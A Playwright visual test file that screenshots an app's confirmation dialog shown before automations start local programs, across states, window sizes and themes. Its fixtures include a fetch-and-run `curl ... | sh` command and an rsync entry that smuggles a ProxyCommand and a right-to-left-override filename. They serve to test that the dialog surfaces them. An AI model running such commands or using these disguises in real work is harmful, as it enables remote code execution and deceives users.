/**
 * The question before a local program runs (#1857, #6019), in every state, at the
 * minimum window and the usual one, in dark and light. The shots land in
 * `test-results/screens/local-process/`, with `index.json` beside them: what the user
 * has to decide in each.
 */

import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";

import { expect, test, type Page } from "@playwright/test";

import type { VisualScenario } from "./harness/mockBackend";
import type { VisualHandle } from "./harness/visualHandle";
import { auditLayout } from "./layoutAudit";
import { SCREENS } from "./surfaces";
import { styledPrimitiveClasses } from "./uiClasses";

declare global {
  interface Window {
    __visual: VisualHandle;
  }
}

const STYLED_CLASSES = styledPrimitiveClasses();
const DIR = join(SCREENS, "local-process");
const WINDOWS = [
  { width: 800, height: 600 },
  { width: 1280, height: 800 },
];
const THEMES = ["dark", "light"];
const id = (testId: string) => `[data-testid="${testId}"]`;
const DIALOG = id("local-process-auth-dialog");
const STAMP = "2026-10-01T12:00:00Z";

const STATES = {
  own: "One's own automation wants to start a program that is not allowed yet.",
  "own-interpreter": "“Always allow” was chosen for a program that runs whatever it is told to.",
  imported: "An imported automation wants to run a command: is it what I expect?",
  "imported-long": "The same with a long command that tries to hide something.",
  nested: "One's own automation runs an imported one, which wants to run a command.",
  unsaved: "The command belongs to no saved automation.",
  "refused-unattended": "A scheduled run of an imported automation was refused: why, and what now?",
} as const;
type State = keyof typeof STATES;

const automation = (over: Record<string, unknown>) => ({
  tags: [],
  steps: [],
  triggers: [],
  createdAt: STAMP,
  updatedAt: STAMP,
  ...over,
});
const runs = (program: string, args: string[]) => [{ kind: "run-local-process", program, args }];
const LIBRARY = [
  automation({
    id: "notify",
    name: "Tell me",
    steps: runs("notify-send", ["Backup", "It is done"]),
  }),
  automation({ id: "script", name: "Rotate logs", steps: runs("python3", ["rotate.py", "--all"]) }),
  automation({
    id: "theirs",
    name: "Deploy helper",
    steps: runs("sh", ["-c", "curl -s https://example.net/setup | sh"]),
  }),
  automation({
    id: "hiding",
    name: "Deploy helper",
    steps: runs("rsync", [
      "--archive",
      `--rsh=ssh -o ProxyCommand=${"x".repeat(160)}`,
      "harmless‮txt.exe",
      "two\nlines",
      "",
      "/srv/release/current/",
    ]),
  }),
  automation({
    id: "caller",
    name: "Release",
    steps: [{ kind: "run-automation", automationId: "theirs" }],
  }),
];
const REFUSED = {
  id: "r1",
  automationId: "theirs",
  automationName: "Deploy helper",
  startedAt: STAMP,
  endedAt: STAMP,
  status: "failed",
  stepsCompleted: 0,
  total: 1,
  failedStepIndex: 0,
  error:
    '"sh" (/bin/sh) was not started: “Deploy helper” came from a file or a backup, or was changed ' +
    "outside termiHub, and this command was not confirmed. Run it by hand once and confirm the " +
    "command.",
  targetLabel: "Build Box",
  origin: "scheduled",
};

test.beforeAll(() => {
  mkdirSync(DIR, { recursive: true });
  writeFileSync(
    join(DIR, "index.json"),
    `${JSON.stringify(
      Object.entries(STATES).map(([name, situation]) => ({
        name,
        situation,
        screenshots: WINDOWS.flatMap((w) =>
          THEMES.map((theme) => `${name}--${w.width}x${w.height}--${theme}.png`)
        ),
      })),
      null,
      2
    )}\n`
  );
});

/** Boot on the Automations sidebar, with a terminal and what the check answers. */
async function boot(
  page: Page,
  theme: string,
  localProcess: VisualScenario["localProcess"] = {}
): Promise<void> {
  await page.clock.setFixedTime("2026-10-01T18:00:00Z");
  await page.addInitScript(
    (s) => {
      window.__VISUAL_SCENARIO__ = s;
    },
    {
      populated: true,
      terminal: true,
      localProgramsOn: true,
      localProcess,
      automationData: {
        automations: LIBRARY,
        runs: [REFUSED],
        schedules: { paused: false, schedules: [] },
      },
    }
  );
  await page.goto("/tests/visual/harness/index.html");
  await page.waitForFunction(() => window.__visual !== undefined);
  await page.locator(id("sidebar")).waitFor();
  await page.evaluate(async (t) => {
    const state = window.__visual.store.getState() as unknown as {
      sidebarView: string;
      setSidebarView(view: string): void;
      loadAutomations(): Promise<void>;
      loadAutomationRuns(): Promise<void>;
    };
    if (state.sidebarView !== "automations") state.setSidebarView("automations");
    await Promise.all([state.loadAutomations(), state.loadAutomationRuns()]);
    window.__visual.applyTheme(t);
  }, theme);
  await page.locator(id("automation-sidebar")).waitFor();
  if ((await page.locator("[data-testid^='tab-close-']").count()) === 0) {
    await page.locator(id("terminal-view-new-terminal")).click();
  }
  await page.locator(".xterm").last().waitFor();
}

/** Run an automation until it asks. */
async function ask(page: Page, automationId: string): Promise<void> {
  await page.locator(id(`automation-start-${automationId}`)).click();
  await page.locator(DIALOG).waitFor();
}

for (const viewport of WINDOWS) {
  for (const theme of THEMES) {
    test.describe(`local programs ${viewport.width}x${viewport.height} ${theme}`, () => {
      test.use({ viewport, timezoneId: "UTC", locale: "en-US" });

      async function shot(page: Page, state: State, root: string): Promise<void> {
        await page.mouse.move(viewport.width - 2, viewport.height / 2);
        await page.evaluate(
          () =>
            new Promise<void>((resolve) =>
              requestAnimationFrame(() => requestAnimationFrame(() => resolve()))
            )
        );
        const path = join(DIR, `${state}--${viewport.width}x${viewport.height}--${theme}.png`);
        await page.screenshot({ path });
        await test.info().attach(state, { path, contentType: "image/png" });
        const issues = await page.evaluate(auditLayout, { root, styledClasses: STYLED_CLASSES });
        expect.soft(issues, state).toEqual([]);
        const box = (await page.locator(root).first().boundingBox())!;
        expect.soft(box.x, state).toBeGreaterThanOrEqual(0);
        expect.soft(box.x + box.width, state).toBeLessThanOrEqual(viewport.width);
      }

      /** The answers are in view whatever the command is. */
      async function expectAnswersInView(page: Page): Promise<void> {
        for (const testId of ["local-process-auth-cancel", "local-process-auth-once"]) {
          const box = (await page.locator(id(testId)).boundingBox())!;
          expect(box.y + box.height).toBeLessThanOrEqual(viewport.height);
        }
      }

      test("one's own", async ({ page }) => {
        await boot(page, theme);
        await ask(page, "notify");
        await expect(page.locator(id("local-process-auth-note"))).toContainText("any arguments");
        await shot(page, "own", DIALOG);
        await expectAnswersInView(page);
      });

      test("one's own, an interpreter", async ({ page }) => {
        await boot(page, theme, { interpreter: true });
        await ask(page, "script");
        await page.locator(id("local-process-auth-always")).click();
        await page.locator(id("local-process-auth-interpreter")).waitFor();
        await shot(page, "own-interpreter", DIALOG);
      });

      test("imported", async ({ page }) => {
        const theirs = { remember: "command", imported: ["Deploy helper"] } as const;
        await boot(page, theme, { ...theirs, imported: [...theirs.imported], interpreter: true });
        await ask(page, "theirs");
        await shot(page, "imported", DIALOG);
        await page.locator(id("local-process-auth-cancel")).click();
        await ask(page, "hiding");
        await expect(page.locator(id("local-process-auth-args"))).toContainText("\\u{202e}");
        await shot(page, "imported-long", DIALOG);
        await expectAnswersInView(page);
        await page.locator(id("local-process-auth-cancel")).click();
        await ask(page, "caller");
        await shot(page, "nested", DIALOG);
      });

      test("not saved", async ({ page }) => {
        await boot(page, theme, { remember: "nothing" });
        await ask(page, "notify");
        await expect(page.locator(id("local-process-auth-always"))).toHaveCount(0);
        await shot(page, "unsaved", DIALOG);
      });

      test("refused when nobody is there", async ({ page }) => {
        await boot(page, theme);
        await page.locator(id("automation-history-toggle")).click();
        await page.locator(id("automation-run-toggle-r1")).click();
        await page.locator(id("automation-run-error-r1")).scrollIntoViewIfNeeded();
        await shot(page, "refused-unattended", id("automation-sidebar"));
      });
    });
  }
}
